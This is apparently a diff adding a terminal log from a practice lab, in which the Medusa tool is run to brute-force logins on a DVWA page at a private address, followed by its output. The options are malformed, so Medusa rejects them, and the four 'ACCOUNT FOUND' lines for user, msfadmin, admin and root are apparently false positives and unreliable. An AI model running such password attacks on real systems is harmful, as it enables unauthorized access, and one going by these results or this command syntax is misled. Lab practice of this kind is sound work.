@@ -1,0 +1,18 @@
+└─$ medusa -h 10.0.0.2 -U users.txt -P pass.txt -M http \
+-m PAGE: '/dvwa/login.php' \
+-m FORM: 'username="USER"&password="PASS*6Login=Login' \
+-m 'FAIL=Login failed'
+Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+WARNING: Invalid method: PAGE.
+WARNING: Invalid method: FORM.
+WARNING: Invalid method: FAIL=Login failed.
+2026-11-02 17:46:18 ACCOUNT CHECK: [http] Host: 10.0.0.2 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: password (1 of 4 complete)
+2026-11-02 17:46:18 ACCOUNT FOUND: [http] Host: 10.0.0.2 User: user Password: password [SUCCESS]
+2026-11-02 17:46:18 ACCOUNT CHECK: [http] Host: 10.0.0.2 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
+2026-11-02 17:46:18 ACCOUNT FOUND: [http] Host: 10.0.0.2 User: msfadmin Password: password [SUCCESS]
+2026-11-02 17:46:18 ACCOUNT CHECK: [http] Host: 10.0.0.2 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: password (1 of 4 complete)
+2026-11-02 17:46:18 ACCOUNT FOUND: [http] Host: 10.0.0.2 User: admin Password: password [SUCCESS]
+2026-11-02 17:46:18 ACCOUNT CHECK: [http] Host: 10.0.0.2 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: password (1 of 4 complete)
+2026-11-02 17:46:18 ACCOUNT FOUND: [http] Host: 10.0.0.2 User: root Password: password [SUCCESS]
+                                                                                                    
